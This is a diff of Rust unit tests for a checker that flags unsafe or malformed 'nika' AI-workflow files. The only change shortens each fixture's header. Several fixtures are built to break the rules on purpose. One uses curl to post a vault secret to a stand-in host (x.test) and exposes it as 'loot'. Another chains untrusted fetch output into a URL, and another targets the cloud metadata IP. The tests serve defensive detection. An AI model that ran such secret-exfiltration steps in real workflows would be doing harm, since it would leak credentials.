@@ -457,7 +457,7 @@ mod tests {
     #[test]
     fn clean_report_has_zero_findings() {
         let r = report(
-            "nika: v1\nworkflow:\n  id: ok\npermits: { exec: [\"echo\"] }\ntasks:\n  a:\n    exec: { command: [\"echo\", \"x\"] }\n",
+            "nika: ok\npermits: { exec: [\"echo\"] }\ntasks:\n  a:\n    exec: { command: [\"echo\", \"x\"] }\n",
         );
         assert!(r.is_clean());
         assert!(r.findings.is_empty(), "{:#?}", r.findings);
@@ -470,32 +470,32 @@ mod tests {
         let cases: Vec<(&str, &str, &str)> = vec![
             (
                 // conformance: unresolved reference
-                "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
+                "nika: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
                 "conformance",
                 "CONFORM",
             ),
             (
                 // capability escape: exec outside a declared boundary
-                "nika: v1\nworkflow:\n  id: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
+                "nika: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
                 "capability_escape",
                 "PERMITS",
             ),
             (
                 // unknown tool (typo'd builtin)
-                "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    invoke: { tool: \"nika:raed\", args: { path: \"./x\" } }\n",
+                "nika: w\ntasks:\n  a:\n    invoke: { tool: \"nika:raed\", args: { path: \"./x\" } }\n",
                 "unknown_tool",
                 "TOOLS",
             ),
             (
                 // missing required arg
-                "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    invoke: { tool: \"nika:write\", args: { path: \"./x\" } }\n",
+                "nika: w\ntasks:\n  a:\n    invoke: { tool: \"nika:write\", args: { path: \"./x\" } }\n",
                 "missing_arg",
                 "ARGS",
             ),
             (
                 // composition: a templated child target (the PURE half of
                 // the spec-14 lane — fires in every check(), reader-less)
-                "nika: v1\nworkflow:\n  id: w\nconst:\n  v: \"a\"\ntasks:\n  a:\n    invoke: { workflow: \"./x-${{ const.v }}.nika.yaml\" }\n",
+                "nika: w\nconst:\n  v: \"a\"\ntasks:\n  a:\n    invoke: { workflow: \"./x-${{ const.v }}.nika.yaml\" }\n",
                 "composition",
                 "COMPOSITION",
             ),
@@ -503,7 +503,7 @@ mod tests {
                 // trifecta: all three legs declared + an ungated egress the
                 // untrusted content REACHES (NEP-0002 v2.0 · the second
                 // fetch's url rides the first's untrusted output)
-                "nika: v1\nworkflow:\n  id: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
+                "nika: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
                 "trifecta",
                 "TRIFECTA",
             ),
@@ -511,7 +511,7 @@ mod tests {
                 // write-write (F-P15 · NEP-0014 law 1): two incomparable
                 // writers on one literal path — the boundary declares the
                 // writes, the ORDER is what the file never declares
-                "nika: v1\nworkflow:\n  id: w\npermits:\n  fs: { write: [\"out/**\"] }\n  tools: [\"nika:write\"]\ntasks:\n  left:\n    invoke: { tool: \"nika:write\", args: { path: out/report.md, content: \"a\" } }\n  right:\n    invoke: { tool: \"nika:write\", args: { path: out/report.md, content: \"b\" } }\n",
+                "nika: w\npermits:\n  fs: { write: [\"out/**\"] }\n  tools: [\"nika:write\"]\ntasks:\n  left:\n    invoke: { tool: \"nika:write\", args: { path: out/report.md, content: \"a\" } }\n  right:\n    invoke: { tool: \"nika:write\", args: { path: out/report.md, content: \"b\" } }\n",
                 "write_conflict",
                 "WRITES",
             ),
@@ -536,7 +536,7 @@ mod tests {
     #[test]
     fn codes_ride_only_where_canonical() {
         let r = report(
-            "nika: v1\nworkflow:\n  id: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
+            "nika: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
         );
         let escape = r
             .findings
@@ -553,7 +553,7 @@ mod tests {
         // secret_leak → NIKA-SEC-006 · secret_egress → NIKA-SEC-007 —
         // the message keeps the taint trace verbatim (it IS the witness).
         let r = report(
-            "nika: v1\nworkflow:\n  id: w\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  a:\n    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://x.test\"] }\noutputs:\n  loot: ${{ secrets.k }}\n",
+            "nika: w\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  a:\n    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://x.test\"] }\noutputs:\n  loot: ${{ secrets.k }}\n",
         );
         let leak = r
             .findings
@@ -583,7 +583,7 @@ mod tests {
 
         // policy → NIKA-POLICY-001 (spec 10).
         let r = report(
-            "nika: v1\nworkflow:\n  id: w\npolicy:\n  limits: { max_tasks: 1 }\ntasks:\n  a:\n    infer: { prompt: \"x\" }\n  b:\n    infer: { prompt: \"y\" }\n",
+            "nika: w\npolicy:\n  limits: { max_tasks: 1 }\ntasks:\n  a:\n    infer: { prompt: \"x\" }\n  b:\n    infer: { prompt: \"y\" }\n",
         );
         let policy = r
             .findings
@@ -597,7 +597,7 @@ mod tests {
         // witness task (the SINK the content reaches · v2.0), one voice
         // with the conformance-code surface.
         let r = report(
-            "nika: v1\nworkflow:\n  id: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
+            "nika: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
         );
         let tri = r
             .findings
@@ -618,7 +618,7 @@ mod tests {
     #[test]
     fn serialization_skips_absent_optionals() {
         let r = report(
-            "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
+            "nika: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
         );
         let json = serde_json::to_value(&r.findings).expect("serializes");
         let row = &json[0];
@@ -634,7 +634,7 @@ mod tests {
     #[test]
     fn a_wildcard_net_http_entry_is_an_error_finding() {
         let r = report(
-            "nika: v1\nworkflow:\n  id: w\npermits:\n  net: { http: [\"*.github.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.github.com/x\" } }\n",
+            "nika: w\npermits:\n  net: { http: [\"*.github.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.github.com/x\" } }\n",
         );
         assert!(!r.is_clean(), "the wildcard is a run-blocker");
         let hit = r
@@ -654,7 +654,7 @@ mod tests {
     #[test]
     fn a_floor_blocked_net_http_entry_is_a_dead_grant_finding() {
         let r = report(
-            "nika: v1\nworkflow:\n  id: w\npermits:\n  net: { http: [\"169.254.169.254\", \"api.x.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.x.com/x\" } }\n",
+            "nika: w\npermits:\n  net: { http: [\"169.254.169.254\", \"api.x.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.x.com/x\" } }\n",
         );
         assert!(!r.is_clean());
         let hit = r
